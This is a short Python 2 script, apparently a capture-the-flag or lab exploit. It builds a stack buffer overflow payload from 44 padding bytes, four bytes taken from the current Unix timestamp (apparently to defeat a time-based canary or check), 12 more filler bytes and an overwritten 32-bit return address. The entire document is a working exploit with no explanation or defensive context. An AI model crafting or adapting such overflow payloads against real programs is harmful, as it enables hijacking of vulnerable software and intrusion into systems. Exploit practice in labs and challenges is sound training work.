import time

# Get timestamp, convert to an int, then convert to hex, then to a string
unix_timestamp = int(time.time())
unix_timestamp = str(hex(unix_timestamp))
unix_timestamp = unix_timestamp[2:] # remove the "0x" prefix from the string

# Grab 4 sets of 2 bytes from the complete string
first = chr(int(unix_timestamp[0:2], 16))
second = chr(int(unix_timestamp[2:4], 16))
third = chr(int(unix_timestamp[4:6], 16))
fourth = chr(int(unix_timestamp[6:8], 16))

# Print the result
print "\x61"*44+fourth+third+second+first+"\x62"*12+"\x96\x92\x04\x08"